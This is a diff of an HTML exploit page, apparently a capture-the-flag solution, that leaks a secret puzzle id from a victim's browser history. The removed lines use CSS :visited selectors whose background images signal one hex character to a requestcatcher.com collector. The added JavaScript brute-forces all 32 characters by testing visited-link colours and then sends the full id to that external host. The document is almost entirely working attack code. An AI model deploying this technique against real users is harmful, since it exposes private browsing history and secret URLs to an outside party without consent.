@@ -2,26 +2,35 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>CTF First Char Leak</title>
+  <title>CTF Leak JS</title>
   <style>
-    a[href^="http://34.146.134.179:3000/puzzle?id=0"]:visited::after { content: ''; display: block; width:1px; height:1px; background-image: url("https://singetu0096.requestcatcher.com?pos=0&hex=0"); }
-    a[href^="http://34.146.134.179:3000/puzzle?id=1"]:visited::after { content: ''; display: block; width:1px; height:1px; background-image: url("https://singetu0096.requestcatcher.com?pos=0&hex=1"); }
-    a[href^="http://34.146.134.179:3000/puzzle?id=2"]:visited::after { content: ''; display: block; width:1px; height:1px; background-image: url("https://singetu0096.requestcatcher.com?pos=0&hex=2"); }
-    a[href^="http://34.146.134.179:3000/puzzle?id=3"]:visited::after { content: ''; display: block; width:1px; height:1px; background-image: url("https://singetu0096.requestcatcher.com?pos=0&hex=3"); }
-    a[href^="http://34.146.134.179:3000/puzzle?id=4"]:visited::after { content: ''; display: block; width:1px; height:1px; background-image: url("https://singetu0096.requestcatcher.com?pos=0&hex=4"); }
-    a[href^="http://34.146.134.179:3000/puzzle?id=5"]:visited::after { content: ''; display: block; width:1px; height:1px; background-image: url("https://singetu0096.requestcatcher.com?pos=0&hex=5"); }
-    a[href^="http://34.146.134.179:3000/puzzle?id=6"]:visited::after { content: ''; display: block; width:1px; height:1px; background-image: url("https://singetu0096.requestcatcher.com?pos=0&hex=6"); }
-    a[href^="http://34.146.134.179:3000/puzzle?id=7"]:visited::after { content: ''; display: block; width:1px; height:1px; background-image: url("https://singetu0096.requestcatcher.com?pos=0&hex=7"); }
-    a[href^="http://34.146.134.179:3000/puzzle?id=8"]:visited::after { content: ''; display: block; width:1px; height:1px; background-image: url("https://singetu0096.requestcatcher.com?pos=0&hex=8"); }
-    a[href^="http://34.146.134.179:3000/puzzle?id=9"]:visited::after { content: ''; display: block; width:1px; height:1px; background-image: url("https://singetu0096.requestcatcher.com?pos=0&hex=9"); }
-    a[href^="http://34.146.134.179:3000/puzzle?id=a"]:visited::after { content: ''; display: block; width:1px; height:1px; background-image: url("https://singetu0096.requestcatcher.com?pos=0&hex=a"); }
-    a[href^="http://34.146.134.179:3000/puzzle?id=b"]:visited::after { content: ''; display: block; width:1px; height:1px; background-image: url("https://singetu0096.requestcatcher.com?pos=0&hex=b"); }
-    a[href^="http://34.146.134.179:3000/puzzle?id=c"]:visited::after { content: ''; display: block; width:1px; height:1px; background-image: url("https://singetu0096.requestcatcher.com?pos=0&hex=c"); }
-    a[href^="http://34.146.134.179:3000/puzzle?id=d"]:visited::after { content: ''; display: block; width:1px; height:1px; background-image: url("https://singetu0096.requestcatcher.com?pos=0&hex=d"); }
-    a[href^="http://34.146.134.179:3000/puzzle?id=e"]:visited::after { content: ''; display: block; width:1px; height:1px; background-image: url("https://singetu0096.requestcatcher.com?pos=0&hex=e"); }
-    a[href^="http://34.146.134.179:3000/puzzle?id=f"]:visited::after { content: ''; display: block; width:1px; height:1px; background-image: url("https://singetu0096.requestcatcher.com?pos=0&hex=f"); }
+    .checklink { color: black; }
+    .checklink:visited { color: red; }
   </style>
+</head>
 <body>
-  <a href="http://34.146.134.179:3000/puzzle?id=c6d23bca8ce98a3cf163dfc3a54ec61c">Link</a>
+  <a id="test" class="checklink" style="display:none"></a>
+  <script>
+    (async () => {
+      const base = 'http://34.146.134.179:3000/puzzle?id=';
+      const catcher = 'https://singetu0096.requestcatcher.com';
+      const hex = '0123456789abcdef';
+      let id = '';
+      const a = document.getElementById('test');
+      for (let pos = 0; pos < 32; pos++) {
+        for (const c of hex) {
+          a.href = base + id + c;
+          document.body.appendChild(a);
+          await new Promise(requestAnimationFrame);
+          if (getComputedStyle(a).color === 'rgb(255, 0, 0)') {
+            id += c;
+            break;
+          }
+          document.body.removeChild(a);
+        }
+      }
+      new Image().src = `${catcher}?fullid=${id}`;
+    })();
+  </script>
 </body>
 </html>
